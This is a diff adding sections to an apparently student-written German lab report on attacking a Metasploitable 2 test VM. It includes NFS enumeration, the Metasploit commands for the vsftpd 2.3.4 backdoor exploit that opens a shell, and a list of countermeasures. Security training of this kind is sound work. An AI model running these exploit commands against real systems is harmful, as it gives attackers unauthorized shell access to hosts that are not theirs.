@@ -148,3 +148,94 @@ Beachten Sie, dass UDP-Scans viele Fehlalarme verursachen können. Die Fehlalarm
 Natürlich wissen wir, dass das vorbereitete «Metasploitable 2»-System absichtlich anfällig ist. Man kann daher nur vermuten, dass die meisten, wenn nicht alle Dienste Schwachstellen, Hintertüren usw. 
 enthalten. 
 
+## 2.5 Recherche und Durchführung eines Exploits
+
+Nachdem Sie nun diverse Schwachstellen im Netzwerk gefunden haben, wollen sie herausfinden, welche Exploits mit diesen gewonnenen Erkenntnissen erfolgreich umgesetzt werden können. Recherchieren Sie im Internet und sammeln Sie Informationen. Das Ziel ist es, in ihr ausgewähltes Zielsystem einzudringen. Viele Wege führen nach Rom.
+
+    Entscheiden Sie sich für zwei Angriffsvarianten
+    Recherchieren und finden Sie angemessene Quellen / Ressourcen, um einen Angriff entsprechend durchzuführen (Quellen müssen in der Doku angegeben werden)
+    Wählen Sie einen der beiden Exploits aus und führen Sie diesen durch, dokumentieren Sie
+    Definieren Sie drei Massnahmen, welche von der Gegenseite unterlassen wurden, um den Angriff zu vermeiden/erschweren (die Resilienz des Systems entsprechend zu erhöhen)
+
+Experimentieren sie selbst ein wenig: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide
+
+### 2.5.1 Unix Basics
+
+Wir schauen uns nun NFS (Network File System) an.Es kann durch das abfragen von Port 2049 vom Portmapper identifiziert werden. 
+
+```bash
+sudo apt install rpcbind nfs-common -y
+```
+danach:
+```bash
+rpcinfo -p 172.18.0.3
+```
+Output:
+![alt text](image-5.png)
+
+### 2.5.2 vsftpd Backdoor Exploit
+
+- Service: vsftpd 2.3.4 (läuft standardmäßig auf Metasploitable2 auf Port 21)
+
+- Schwachstelle: Enthält eine absichtlich eingebaute Backdoor. Wenn man sich mit dem Benutzernamen :) einloggt, öffnet sich ein Shell-Zugang.
+
+quelle:https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide#vsftpd
+
+### 3 Angriff
+
+Eckdaten:
+- vsftpd 2.3.4 Backdoor
+
+- Service: FTP, Port 21
+
+- Exploit: exploit/unix/ftp/vsftpd_234_backdoor
+
+## 3.1 Durchführung des Angriffs
+zuerst Metasploit starten:
+
+```bash
+msfconsole
+```
+
+Wenn du das getan hast, kannst du nun den Exploit starten:
+
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 172.18.0.3
+run
+```
+
+Output:
+![alt text](image-6.png)
+
+Nachdem der Exploit abgeschlossen ist, wir die neue Session automatisch geöffnet und du kannst mit linux folgenden befehl eigeben:
+
+```bash
+
+whoami
+```
+![alt text](image-7.png)
+
+
+### 3.2 Gegenmassnahmen
+
+#### Nr.1 Systemhardening & Patching
+
+- Regelmässige Updates: Betriebsystem und Dineste aktuell halten. Automatische Security Patches aktivieren.
+
+- Abschalten unsicheren Programme: Wenn Programme nicht genutzt werden sind es sicherheitslücken die einfach zu schließen sind.
+
+- Least Privilege: Nur nötige Benutzer und Gruppen verwenden.
+
+#### Nr.2 Service Reduction
+
+- Unnötige Dienste deaktivieren: Dienstprogramme die umbedingt gebraucht werden anbehalten, der rest kann deaktiviert werden.
+
+- Attack Surface Reduction: Umso weniger offene Ports und Laufende Dienste, desto kleiner ist die Angriffsfläche.
+
+#### Nr.3 Netzwerksegmentierung & Firewall
+
+
+- Netzwerkzonen: Trenne Test und Live-Systeme. DMZ, Intern und Extern sollten getrennt werden. 
+
+- Firewall: Nur notwenige Ports offen halten, den rest deaktivieren.
